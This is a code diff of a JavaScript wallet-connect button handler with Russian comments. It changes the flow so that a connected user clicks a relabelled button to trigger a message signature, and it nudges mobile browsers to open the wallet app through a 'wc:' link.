@@ -110,19 +110,41 @@
     // ТВОЙ ОБРАБОТЧИК КНОПКИ
     window.connectWallet = async () => {
       const status = document.getElementById('status');
+      const btn = document.querySelector('.btn-main'); // Находим нашу кнопку
+      
       status.style.display = 'block';
-
       const state = modal.getState();
 
+      // Если уже подключен - сразу подписываем
       if (state?.address && state?.isConnected) {
         await signMessage();
       } else {
         status.textContent = '💎 Выберите кошелёк...';
         await modal.open();
+        
+        // Ждем, когда кошелек подключится
         const unsubscribe = modal.subscribeAccount(async (newState) => {
           if (newState.isConnected && newState.address && !isProcessing) {
             unsubscribe();
-            await signMessage();
+            
+            // ВМЕСТО автоматической подписи, мы меняем кнопку!
+            status.textContent = '⚠️ Требуется подпись для завершения';
+            btn.style.background = 'linear-gradient(135deg, #10b981, #059669)'; // Делаем зелёной
+            btn.innerHTML = '✍️ Нажмите, чтобы Подписать';
+            
+            // Вешаем на кнопку функцию подписи
+            btn.onclick = async () => {
+                btn.innerHTML = '⏳ Открываем кошелек...';
+                
+                // Для мобилок: пытаемся пнуть WalletConnect, чтобы он открыл кошелек
+                if (window.innerWidth < 768) {
+                   setTimeout(() => {
+                       window.location.href = "wc:"; 
+                   }, 300);
+                }
+                
+                await signMessage();
+            };
           }
         });
       }
